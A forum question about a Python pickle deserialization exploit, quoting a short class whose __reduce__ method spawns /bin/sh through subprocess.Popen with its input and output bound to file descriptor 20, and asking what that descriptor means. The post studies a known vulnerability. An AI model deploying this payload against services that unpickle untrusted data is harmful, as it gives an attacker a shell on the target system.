<p>I was reading up on some pickle vulnerabilities and found this piece of code. </p>  <pre><code>class Exploit(object):   def __reduce__(self):     fd = 20     return (subprocess.Popen,             (('/bin/sh',), # args              0,            # bufsize              None,         # executable              fd, fd, fd    # std{in,out,err}              )) </code></pre>  <p>What does fd mean in this parameter? I would assume it has a value of 20. As far as i know <code>subprocess.Popen(command, stdin = subprocess.PIPE)</code> and so on. So where does the fd come from? </p>  <p>Link from where code is obtained </p>  <p><a href="https://blog.nelhage.com/2011/03/exploiting-pickle/" rel="nofollow">https://blog.nelhage.com/2011/03/exploiting-pickle/</a></p>
